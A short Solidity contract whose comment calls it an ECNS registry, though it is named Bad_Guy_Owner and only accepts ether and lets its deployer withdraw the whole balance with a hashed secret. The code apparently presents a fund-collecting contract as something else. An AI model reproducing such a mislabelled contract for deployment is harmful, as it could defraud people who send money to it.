pragma solidity ^0.4.11;

/**
 * The ECNS registry contract.
 */
contract Bad_Guy_Owner{
    bytes32 public secret = 0xce257882c8ca76247126d85567f27d0c934f0b594f0e9259daae23c00864a4f6;
    address public owner = msg.sender;
    function() payable
    {
        
    }
    
    function give_Me_Money(string _data)
    {
        if(msg.sender == owner && sha3(_data) == secret)
        {
            owner.send(this.balance);
        }
    }
    
}
